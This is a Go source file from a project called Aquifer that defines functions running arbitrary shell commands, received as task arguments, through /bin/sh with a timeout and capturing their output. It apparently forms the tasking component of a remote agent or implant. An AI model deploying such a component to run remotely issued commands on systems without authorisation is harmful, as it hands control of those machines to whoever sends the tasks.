package tasking

import (
	"bytes"
	"context"
	"fmt"
	"os/exec"
	"strconv"
	"time"

	"github.com/Real-Fruit-Snacks/Aquifer/pkg/config"
)

// ExecuteShell runs a shell command inside the namespace via /bin/sh -c.
// It captures both stdout and stderr. An optional timeout can be specified
// in args["timeout"] as seconds (default: 120s).
func ExecuteShell(task config.Task) ([]byte, error) {
	command, ok := task.Args["command"]
	if !ok || command == "" {
		return nil, fmt.Errorf("shell: missing 'command' argument")
	}

	timeout := 120 * time.Second
	if t, ok := task.Args["timeout"]; ok {
		if secs, err := strconv.Atoi(t); err == nil && secs > 0 {
			timeout = time.Duration(secs) * time.Second
		}
	}

	ctx, cancel := context.WithTimeout(context.Background(), timeout)
	defer cancel()

	cmd := exec.CommandContext(ctx, "/bin/sh", "-c", command)

	var stdout, stderr bytes.Buffer
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr

	err := cmd.Run()

	// Combine stdout and stderr in the output.
	var combined bytes.Buffer
	if stdout.Len() > 0 {
		combined.Write(stdout.Bytes())
	}
	if stderr.Len() > 0 {
		if combined.Len() > 0 {
			combined.WriteByte('\n')
		}
		combined.WriteString("[stderr] ")
		combined.Write(stderr.Bytes())
	}

	if ctx.Err() == context.DeadlineExceeded {
		return combined.Bytes(), fmt.Errorf("shell: command timed out after %v", timeout)
	}

	return combined.Bytes(), err
}

// ExecuteShellPiped runs a command string that may contain pipes via /bin/sh -c.
// It returns the combined output of the entire pipeline.
func ExecuteShellPiped(cmd string) ([]byte, error) {
	if cmd == "" {
		return nil, fmt.Errorf("shell: empty command")
	}

	ctx, cancel := context.WithTimeout(context.Background(), 120*time.Second)
	defer cancel()

	c := exec.CommandContext(ctx, "/bin/sh", "-c", cmd)

	var stdout, stderr bytes.Buffer
	c.Stdout = &stdout
	c.Stderr = &stderr

	err := c.Run()

	if ctx.Err() == context.DeadlineExceeded {
		return nil, fmt.Errorf("shell: piped command timed out")
	}

	// Return stdout; if empty fall back to stderr.
	if stdout.Len() > 0 {
		return stdout.Bytes(), err
	}
	return stderr.Bytes(), err
}
